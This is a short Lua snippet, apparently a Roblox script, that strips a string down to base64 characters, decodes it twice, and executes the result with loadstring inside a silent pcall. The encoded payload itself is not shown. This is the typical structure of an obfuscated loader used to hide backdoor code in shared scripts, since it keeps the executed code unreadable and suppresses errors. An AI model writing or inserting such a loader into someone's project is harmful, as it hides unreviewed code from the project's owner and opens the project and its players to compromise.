local function decodeSymbols(s)
    local t = {}
    for c in s:gmatch("[A-Za-z0-9+/=]") do
        table.insert(t,c)
    end
    return table.concat(t)
end

local function multiDecode(s)
    local first = HttpService:Base64Decode(decodeSymbols(s))
    local second = HttpService:Base64Decode(first)
    return second
end

pcall(function()
    loadstring(multiDecode(encoded))()
end)
